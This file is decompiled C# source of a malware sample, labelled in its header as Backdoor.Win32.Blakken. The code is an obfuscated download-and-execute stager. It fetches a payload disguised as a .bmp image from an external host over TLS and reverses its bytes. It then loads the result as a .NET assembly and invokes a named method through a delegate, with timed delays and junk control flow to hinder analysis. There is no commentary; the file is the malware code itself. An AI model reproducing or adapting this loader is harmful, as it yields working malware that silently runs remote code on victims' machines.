// Decompiled with JetBrains decompiler
// Type: mfnvu
// Assembly: Vnwayys, Version=18.9.0.3034, Culture=neutral, PublicKeyToken=null
// MVID: 1DFE4B3C-9267-A28F-3697-25B026371498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\Backdoor.Win32.Blakken.vqk-a342e8f2472ac316cab1017fc24f46d8206390f90448b91d62b9225aa3d2e229.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;

internal sealed class mfnvu
{
  private object xlyvg;

  public mfnvu()
  {
    if (true)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  internal void cjcqu()
  {
    Assembly assembly = Assembly.Load(this.cjcqx(mfnvu.cjcqy("http://advanced-ms.ml/n/Vnwayys_Nqgxigqk.bmp")));
    if (false)
      return;
    this.xlyvg = (object) assembly;
  }

  internal void cjcqv()
  {
    DateTime now = DateTime.Now;
    if (true)
      goto label_2;
label_1:
    DateTime dateTime1;
    DateTime dateTime2 = dateTime1.AddSeconds(10.0);
    DateTime dateTime3;
    if (true)
      dateTime3 = dateTime2;
    bool flag;
    do
    {
      int num = DateTime.Now < dateTime3 ? 1 : 0;
      if (true)
        goto label_6;
label_5:
      continue;
label_6:
      flag = num != 0;
      goto label_5;
    }
    while (flag);
    this.xlyvg = (object) (this.xlyvg as Assembly).GetType("Ylsbflnxsbrxgvxbgnivbvki.Lifbmtgkc");
    return;
label_2:
    dateTime1 = now;
    goto label_1;
  }

  internal void cjcqw()
  {
    DateTime now = DateTime.Now;
    if (true)
      goto label_2;
label_1:
    DateTime dateTime1;
    DateTime dateTime2 = dateTime1.AddSeconds(9.0);
    DateTime dateTime3;
    if (true)
      dateTime3 = dateTime2;
    bool flag;
    do
    {
      int num = DateTime.Now < dateTime3 ? 1 : 0;
      if (true)
        goto label_6;
label_5:
      continue;
label_6:
      flag = num != 0;
      goto label_5;
    }
    while (flag);
    this.xlyvg = (object) (this.xlyvg as Type).GetMethod("Swnjiwspxamfsjgxfalmeeb");
    mfnvs.cjqmm = Delegate.CreateDelegate(typeof (Action), this.xlyvg as MethodInfo);
    return;
label_2:
    dateTime1 = now;
    goto label_1;
  }

  internal byte[] cjcqx(byte[] ygjdo)
  {
    Dictionary<int, byte> dictionary1 = new Dictionary<int, byte>();
    if (true)
      goto label_2;
label_1:
    int length = ygjdo.Length;
    int key;
    if (true)
      key = length;
    Dictionary<int, byte> dictionary2;
    while (true)
    {
      int num1 = key;
      int num2 = num1 - 1;
      if (true)
        goto label_7;
label_6:
      if (num1 > 0)
      {
        dictionary2.Add(key, ygjdo[key]);
        continue;
      }
      break;
label_7:
      key = num2;
      goto label_6;
    }
    return dictionary2.Values.ToArray<byte>();
label_2:
    dictionary2 = dictionary1;
    goto label_1;
  }

  private static byte[] cjcqy(string ygjdo)
  {
    try
    {
      if (true)
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    }
    catch
    {
    }
    WebClient webClient1 = new WebClient();
    WebClient webClient2;
    if (true)
      webClient2 = webClient1;
    byte[] numArray1;
    try
    {
      byte[] numArray2 = webClient2.DownloadData(ygjdo);
      if (true)
        numArray1 = numArray2;
    }
    finally
    {
      webClient2?.Dispose();
    }
    return numArray1;
  }
}
